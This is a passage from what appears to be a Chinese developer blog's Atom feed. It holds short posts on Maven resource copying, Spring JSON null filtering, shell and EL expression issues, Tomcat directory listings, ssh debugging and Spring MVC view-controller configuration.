也可以用下面这样的方式（指定相对url的方式指定outputDirectory） &lt;outputDirectory&gt;target/classes&lt;/outputDirectory&gt; --&gt;</span></span><br><span class="line">              <span class="comment">&lt;!-- 待处理的资源定义 --&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">                  <span class="comment">&lt;!-- 指定resources插件处理哪个目录下的资源文件 --&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources/$&#123;deploy.env&#125;<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">                  <span class="comment">&lt;!-- 指定不需要处理的资源 &lt;excludes&gt; &lt;exclude&gt;WEB-INF/*.*&lt;/exclude&gt; &lt;/excludes&gt; --&gt;</span></span><br><span class="line">                  <span class="comment">&lt;!-- 是否对待处理的资源开启过滤模式 (resources插件的copy-resources目标也有资源过滤的功能，这里配置的 这个功能的效果跟&lt;build&gt;&lt;resources&gt;&lt;resource&gt;下配置的资源过滤是一样的，只不过可能执行的阶段不一样， </span></span><br><span class="line"><span class="comment">                    这里执行的阶段是插件指定的validate阶段，&lt;build&gt;&lt;resources&gt;&lt;resource&gt;下的配置将是在resources插件的resources目标执行时起作用（在process-resources阶段）) --&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>false<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">inherited</span>&gt;</span><span class="tag">&lt;/<span class="name">inherited</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注</strong>：对于资源拷贝问题，网上也用不少通过 maven-antrun-plugin 插件来完成资源拷贝工作，也可以参考。</p><h2 id="四、参考文档"><a href="#四、参考文档" class="headerlink" title="四、参考文档"></a>四、参考文档</h2><p><a href="http://www.tuicool.com/articles/JfaA7r">利用maven中resources插件的copy-resources目标进行资源copy和过滤</a><br><a href="http://maven.apache.org/plugins/maven-resources-plugin/examples/copy-resources.html">Copy Resources</a><br><a href="http://www.blogjava.net/iduido/archive/2013/03/24/396913.html">使用maven复制配置文件</a><br><a href="https://www.zybuluo.com/haokuixi/note/25985">Maven 如何为不同的环境打包 —— 开发、测试和产品环境</a><br><a href="http://www.tuicool.com/articles/bEbaIz">maven copy file文件到指定目录</a></p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/maven.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、资源结构&quot;&gt;&lt;a href=&quot;#一、资源结构&quot; class=&quot;headerlink&quot; title=&quot;一、资源结构&quot;&gt;&lt;/a&gt;一、资源结构&lt;/h2&gt;&lt;p&gt;maven工程资源结构如下：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;yerba-buena:jvwa yeshaoting$ tree src/main/resources/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;src/main/resources/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;├── app-db.properties&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;├── app.properties&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;├── dev&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;│   ├── app-db.properties&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;│   └── app.properties&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;├── file&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;│   ├── image.jpg&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;│   └── stage6.jsp&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;├── log4j.properties&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;├── model&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;│   └── UserMapper.xml&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;├── prod&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;│   ├── app-db.properties&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;│   └── app.properties&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;├── spring-beans.xml&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;├── spring-db.xml&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;└── spring-mvc.xml&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4 directories, 13 files&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;


&lt;h2 id=&quot;二、需求&quot;&gt;&lt;a href=&quot;#二、需求&quot; class=&quot;headerlink&quot; title=&quot;二、需求&quot;&gt;&lt;/a&gt;二、需求&lt;/h2&gt;&lt;p&gt;服务部署时，希望针对于不同的环境，使用不同的配置文件。&lt;br&gt;针对于当前工程而言，变化的配置文件为app.properties和app-db.properties。&lt;/p&gt;
&lt;p&gt;本地环境使用：src/main/resources/ 目录下的这二个文件。&lt;br&gt;测试环境使用：src/main/resources/dev 目录下的这二个文件。&lt;br&gt;生产环境使用：src/main/resources/prod 目录下的这二个文件。&lt;/p&gt;</summary>
    
    
    
    <category term="后端开发" scheme="http://yeshaoting.cn/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="java" scheme="http://yeshaoting.cn/tags/java/"/>
    
    <category term="maven" scheme="http://yeshaoting.cn/tags/maven/"/>
    
  </entry>
  
  <entry>
    <title>spring过滤值为null的JSON字段</title>
    <link href="http://yeshaoting.cn/article/spring/spring%E8%BF%87%E6%BB%A4%E5%80%BC%E4%B8%BAnull%E7%9A%84JSON%E5%AD%97%E6%AE%B5/"/>
    <id>http://yeshaoting.cn/article/spring/spring%E8%BF%87%E6%BB%A4%E5%80%BC%E4%B8%BAnull%E7%9A%84JSON%E5%AD%97%E6%AE%B5/</id>
    <published>2016-02-28T08:57:00.000Z</published>
    <updated>2021-07-01T04:25:32.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/spring.png" class="img-logo img-center" /><h2 id="问题说明"><a href="#问题说明" class="headerlink" title="问题说明"></a>问题说明</h2><p>使用@ResponseBody注解的spring接口返回的JSON格式结果有时会返回包含值为null的字段，但是与前端联调可能并不希望包含这样的字段。<br>因此，需要过滤掉这类字段。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>spring json序列化时，通过<code>com.fasterxml.jackson.annotation.JsonInclude.Include</code>指定是否返回值为null的字段。</p><p>如下配置所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:message-converters</span> <span class="attr">register-defaults</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.http.converter.json.MappingJackson2HttpMessageConverter&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;objectMapper&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;com.fasterxml.jackson.databind.ObjectMapper&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;serializationInclusion&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">value</span> <span class="attr">type</span>=<span class="string">&quot;com.fasterxml.jackson.annotation.JsonInclude.Include&quot;</span>&gt;</span>NON_NULL<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:message-converters</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:annotation-driven</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="http://segmentfault.com/q/1010000002522525">http://segmentfault.com/q/1010000002522525</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/spring.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;问题说明&quot;&gt;&lt;a href=&quot;#问题说明&quot; class=&quot;headerlink&quot; title=&quot;问题说明&quot;&gt;&lt;/</summary>
      
    
    
    
    <category term="后端开发" scheme="http://yeshaoting.cn/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="java" scheme="http://yeshaoting.cn/tags/java/"/>
    
    <category term="issue" scheme="http://yeshaoting.cn/tags/issue/"/>
    
    <category term="spring" scheme="http://yeshaoting.cn/tags/spring/"/>
    
  </entry>
  
  <entry>
    <title>Syntax error- &quot;(&quot; unexpected</title>
    <link href="http://yeshaoting.cn/article/shell/Syntax%20error-%20%22(%22%20unexpected/"/>
    <id>http://yeshaoting.cn/article/shell/Syntax%20error-%20%22(%22%20unexpected/</id>
    <published>2016-02-28T08:56:00.000Z</published>
    <updated>2021-07-01T04:25:32.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/bash.png" class="img-logo img-center" /><h2 id="一、问题描述"><a href="#一、问题描述" class="headerlink" title="一、问题描述"></a>一、问题描述</h2><p>假如我们在shell文件定义了一个数组pid=(0 0 0 0)，运行文件后则会收到报错：Syntax error: “(“ unexpected。</p><h2 id="二、原因"><a href="#二、原因" class="headerlink" title="二、原因"></a>二、原因</h2><p>主要是因为Linux系统shell版本不兼容引起的。 shell的版本有sh,ksh,csh, bash，dash……等等。用命令ls -al /bin/sh可以得到我们当前所用的Linux系统的shell属于何版本。</p><h2 id="三、解决"><a href="#三、解决" class="headerlink" title="三、解决"></a>三、解决</h2><p>通过将当前通过以下方式可以使 shell 切换回 bash：<br><code>sudo dpkg-reconfigure dash</code><br>然后选择 no 或者“否 ”，并确认。这样做将重新配置 dash，并使其不作为默认的 shell 工具。</p><h2 id="四、参考文档"><a href="#四、参考文档" class="headerlink" title="四、参考文档"></a>四、参考文档</h2><p><a href="http://blog.csdn.net/breeze5428/article/details/27353583">Shell编程笔记——Syntax error: “(“ unexpected</a><br><a href="http://ask.chinaunix.net/question/974">http://ask.chinaunix.net/question/974</a><br><a href="http://bbs.csdn.net/topics/390132876">http://bbs.csdn.net/topics/390132876</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/bash.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、问题描述&quot;&gt;&lt;a href=&quot;#一、问题描述&quot; class=&quot;headerlink&quot; title=&quot;一、问题描述</summary>
      
    
    
    
    <category term="系统脚本" scheme="http://yeshaoting.cn/categories/%E7%B3%BB%E7%BB%9F%E8%84%9A%E6%9C%AC/"/>
    
    
    <category term="issue" scheme="http://yeshaoting.cn/tags/issue/"/>
    
    <category term="shell" scheme="http://yeshaoting.cn/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>EL access a map value by Integer key</title>
    <link href="http://yeshaoting.cn/article/java/EL%20access%20a%20map%20value%20by%20Integer%20key/"/>
    <id>http://yeshaoting.cn/article/java/EL%20access%20a%20map%20value%20by%20Integer%20key/</id>
    <published>2016-02-28T08:24:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/javaee.png" class="img-logo img-center" /><p>el表达式中，默认数值类型为Long型。</p><h2 id="一、问题描述"><a href="#一、问题描述" class="headerlink" title="一、问题描述"></a>一、问题描述</h2><p><strong>举例说明</strong>：<br>servlet定义并返回map数据如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;Integer, String&gt; map = <span class="keyword">new</span> HashMap&lt;Integer, String&gt;();</span><br><span class="line">map.put(<span class="number">1</span>, <span class="string">&quot;One&quot;</span>);</span><br><span class="line">map.put(<span class="number">2</span>, <span class="string">&quot;Two&quot;</span>);</span><br><span class="line">map.put(<span class="number">3</span>, <span class="string">&quot;Three&quot;</span>);</span><br></pre></td></tr></table></figure><p>在jsp页面，通过map[2]不能获取数据Two。因为数值2被装箱成Long型，而map键类型为Integer。<br>因此，在前端不能通过，报异常。</p><h2 id="二、解决方案"><a href="#二、解决方案" class="headerlink" title="二、解决方案"></a>二、解决方案</h2><p>将数值转成int型，如下所示：<br><code>$&#123;map[(2).intValue()]&#125;</code></p><h2 id="三、参考文档"><a href="#三、参考文档" class="headerlink" title="三、参考文档"></a>三、参考文档</h2><p><a href="http://stackoverflow.com/questions/924451/el-access-a-map-value-by-integer-key">http://stackoverflow.com/questions/924451/el-access-a-map-value-by-integer-key</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/javaee.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;p&gt;el表达式中，默认数值类型为Long型。&lt;/p&gt;
&lt;h2 id=&quot;一、问题描述&quot;&gt;&lt;a href=&quot;#一、问题描述&quot; cl</summary>
      
    
    
    
    <category term="后端开发" scheme="http://yeshaoting.cn/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="el" scheme="http://yeshaoting.cn/tags/el/"/>
    
    <category term="java" scheme="http://yeshaoting.cn/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>el数值运算取整</title>
    <link href="http://yeshaoting.cn/article/java/el%E6%95%B0%E5%80%BC%E8%BF%90%E7%AE%97%E5%8F%96%E6%95%B4/"/>
    <id>http://yeshaoting.cn/article/java/el%E6%95%B0%E5%80%BC%E8%BF%90%E7%AE%97%E5%8F%96%E6%95%B4/</id>
    <published>2016-02-28T08:24:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/javaee.png" class="img-logo img-center" /><h2 id="取整"><a href="#取整" class="headerlink" title="取整"></a>取整</h2><p>el表达式除法结果为浮点型，无法通过运算直接得到整数值。<br>通过formatNumber保留整除后0位有效小数即可。<br>如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">fmt:formatNumber</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;8/7)&#125;&quot;</span> <span class="attr">maxFractionDigits</span>=<span class="string">&quot;0&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="http://blog.csdn.net/debbykindom/article/details/5854750">http://blog.csdn.net/debbykindom/article/details/5854750</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/javaee.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;取整&quot;&gt;&lt;a href=&quot;#取整&quot; class=&quot;headerlink&quot; title=&quot;取整&quot;&gt;&lt;/a&gt;取整&lt;/</summary>
      
    
    
    
    <category term="后端开发" scheme="http://yeshaoting.cn/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="el" scheme="http://yeshaoting.cn/tags/el/"/>
    
    <category term="java" scheme="http://yeshaoting.cn/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>tomcat访问系统文件及文件夹</title>
    <link href="http://yeshaoting.cn/article/java/tomcat%E8%AE%BF%E9%97%AE%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E5%8F%8A%E6%96%87%E4%BB%B6%E5%A4%B9/"/>
    <id>http://yeshaoting.cn/article/java/tomcat%E8%AE%BF%E9%97%AE%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E5%8F%8A%E6%96%87%E4%BB%B6%E5%A4%B9/</id>
    <published>2016-02-28T08:24:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/tomcat.png" class="img-logo img-center" /><h2 id="一、进入tomcat目录"><a href="#一、进入tomcat目录" class="headerlink" title="一、进入tomcat目录"></a>一、进入tomcat目录</h2><blockquote><p>cd /home/yeshaoting/java/server/tomcat/apache-tomcat-6.0.37</p></blockquote><h2 id="二、修改web-xml配置"><a href="#二、修改web-xml配置" class="headerlink" title="二、修改web.xml配置"></a>二、修改web.xml配置</h2><blockquote><p>vim conf/web.xml</p></blockquote><h2 id="三、修改listings参数"><a href="#三、修改listings参数" class="headerlink" title="三、修改listings参数"></a>三、修改listings参数</h2><p>找到名为 <strong>default</strong> 的servlet配置。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>default<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.catalina.servlets.DefaultServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>debug<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>0<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>listings<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>修改listings参数值为 <strong>true</strong> 。</p><p>listings参数含义说明如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--   listings            Should directory listings be produced if there --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--                       is no welcome file in this directory?  [false] --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--                       WARNING: Listings for directories with many    --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--                       entries can be slow and may consume            --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--                       significant proportions of server resources.   --&gt;</span></span><br></pre></td></tr></table></figure><h2 id="四、参考文档"><a href="#四、参考文档" class="headerlink" title="四、参考文档"></a>四、参考文档</h2><p><a href="http://blog.csdn.net/guopengzhang/article/details/5948644">http://blog.csdn.net/guopengzhang/article/details/5948644</a><br><a href="http://xueli.blog.51cto.com/3325186/1585859">http://xueli.blog.51cto.com/3325186/1585859</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/tomcat.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、进入tomcat目录&quot;&gt;&lt;a href=&quot;#一、进入tomcat目录&quot; class=&quot;headerlink&quot;</summary>
      
    
    
    
    <category term="后端开发" scheme="http://yeshaoting.cn/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="java" scheme="http://yeshaoting.cn/tags/java/"/>
    
    <category term="tomcat" scheme="http://yeshaoting.cn/tags/tomcat/"/>
    
  </entry>
  
  <entry>
    <title>Connection closed by remote host</title>
    <link href="http://yeshaoting.cn/article/linux/ssh_exchange_identification-%20Connection%20closed%20by%20remote%20host/"/>
    <id>http://yeshaoting.cn/article/linux/ssh_exchange_identification-%20Connection%20closed%20by%20remote%20host/</id>
    <published>2016-02-28T08:23:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="异常内容"><a href="#异常内容" class="headerlink" title="异常内容"></a>异常内容</h2><p>ssh_exchange_identification - Connection closed by remote host</p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>用ssh -v去连有问题的服务器，这时会有比较详细的调试信息在屏幕上输出，可以帮助判断是哪一步出了问题。</p><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="http://www.zhihu.com/question/20023544">http://www.zhihu.com/question/20023544</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;异常内容&quot;&gt;&lt;a href=&quot;#异常内容&quot; class=&quot;headerlink&quot; title=&quot;异常内容&quot;&gt;&lt;/a&gt;异常内容&lt;/h2&gt;&lt;p&gt;ssh_exchange_identification - Connection closed by remote host</summary>
      
    
    
    
    <category term="工具软件" scheme="http://yeshaoting.cn/categories/%E5%B7%A5%E5%85%B7%E8%BD%AF%E4%BB%B6/"/>
    
    
    <category term="issue" scheme="http://yeshaoting.cn/tags/issue/"/>
    
    <category term="ssh" scheme="http://yeshaoting.cn/tags/ssh/"/>
    
  </entry>
  
  <entry>
    <title>mvc-view-controller用法</title>
    <link href="http://yeshaoting.cn/article/spring/mvc-view-controller%E7%94%A8%E6%B3%95/"/>
    <id>http://yeshaoting.cn/article/spring/mvc-view-controller%E7%94%A8%E6%B3%95/</id>
    <published>2016-02-28T05:57:00.000Z</published>
    <updated>2021-07-01T04:25:32.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/spring.png" class="img-logo img-center" /><h2 id="一、重定向"><a href="#一、重定向" class="headerlink" title="一、重定向"></a>一、重定向</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:view-controller</span> <span class="attr">path</span>=<span class="string">&quot;/&quot;</span> <span class="attr">view-name</span>=<span class="string">&quot;redirect:/admin/index&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>说明：即如果当前路径是/，则重定向到/admin/index</p><h2 id="二、view-name"><a href="#二、view-name" class="headerlink" title="二、view name"></a>二、view name</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;mvc:view-controller path=&quot;/&quot; view-name=&quot;admin/index&quot;/&gt;</span><br></pre></td></tr></table></figure><p>如果当前路径是/，则交给相应的视图解析器直接解析为视图<br>如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;defaultViewResolver&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span> <span class="attr">p:order</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;viewClass&quot;</span> <span class="attr">value</span>=<span class="string">&quot;org.springframework.web.servlet.view.JstlView&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;contentType&quot;</span> <span class="attr">value</span>=<span class="string">&quot;text/html&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/WEB-INF/jsp/&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;.jsp&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>则得到的视图是：/WEB-INF/jsp/admin/index.jsp</p><h2 id="三、参考"><a href="#三、参考" class="headerlink" title="三、参考"></a>三、参考</h2><p><a href="http://www.iteye.com/topic/1129445">http://www.iteye.com/topic/1129445</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/spring.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、重定向&quot;&gt;&lt;a href=&quot;#一、重定向&quot; class=&quot;headerlink&quot; title=&quot;一、重定向&quot;</summary>
      
    
    
    
    <category term="后端开发" scheme="http://yeshaoting.cn/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="java" scheme="http://yeshaoting.cn/tags/java/"/>
    
    <category term="spring" scheme="http://yeshaoting.cn/tags/spring/"/>
    
  </entry>
  
  <entry>
    <title>注解切面缺少注解参数</title>
    <link href="http://yeshaoting.cn/article/spring/%E6%B3%A8%E8%A7%A3%E5%88%87%E9%9D%A2%E7%BC%BA%E5%B0%91%E6%B3%A8%E8%A7%A3%E5%8F%82%E6%95%B0/"/>
